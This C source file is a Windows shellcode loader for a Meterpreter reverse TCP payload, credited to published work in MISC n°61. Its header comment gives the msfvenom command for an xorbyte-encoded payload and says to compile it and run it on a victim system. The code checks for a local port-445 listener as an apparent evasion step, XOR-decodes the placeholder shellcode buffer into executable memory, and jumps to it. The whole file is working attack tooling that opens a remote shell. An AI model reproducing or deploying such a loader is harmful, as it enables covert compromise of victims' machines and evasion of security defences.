/* 
 * Nicolas Biscos = 20 May
 * Based on Jerome Nokin work, published in MISC n*61
 * To compile with DevCPP, in Projet Option, Parameters, Linker, add 
 * xxx/Dev-Cpp/lib/libws2_32.a
 *
 * Generate a C payload with Meterpreter using custom xorbyte encoder and update
 * this file, compile, upload and execute the binary on victim system.
 *
 * msfvenom -e x86/xorbyte -p windows/meterpreter/reverse_tcp LHOST=$(ifdata -pa eth0) -f c
 */
#include <stdlib.h>
#include <windows.h>
#include <winsock2.h>


int test_socket(int port)
{
   WSADATA WSAData;
   WSAStartup(MAKEWORD(2,0), &WSAData);
   int hsock = socket(AF_INET, SOCK_STREAM, 0);
   struct sockaddr_in my_addr;
   my_addr.sin_family = AF_INET;
   my_addr.sin_port = htons(445);
   my_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
   if( SOCKET_ERROR == connect(hsock, (const struct sockaddr *)(&my_addr), sizeof(my_addr)))
   {
      WSACleanup();   
      return EXIT_FAILURE;
   }
   WSACleanup();   
   return EXIT_SUCCESS;
}

int main(int argc, char *argv[])
{
// Update SCSIZE and buf with output of msfvenom of xorbyte encoder
#define SCSIZE 580
    unsigned char *lpAlloc, *ptr;
    unsigned int i;
unsigned char buf[] = "...";

    lpAlloc = (unsigned char *)VirtualAlloc(0, SCSIZE/2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if( EXIT_SUCCESS == test_socket(445) )
    {
       ptr = lpAlloc;
       for( i = 0 ; i < SCSIZE ; i+=2 )
       {
          *(ptr++) = (unsigned char)((int)*(buf+i) ^ (int)*(buf+i+1));
       }
       (*(void (*)()) (void*)lpAlloc)();
    }
    return EXIT_SUCCESS;
}
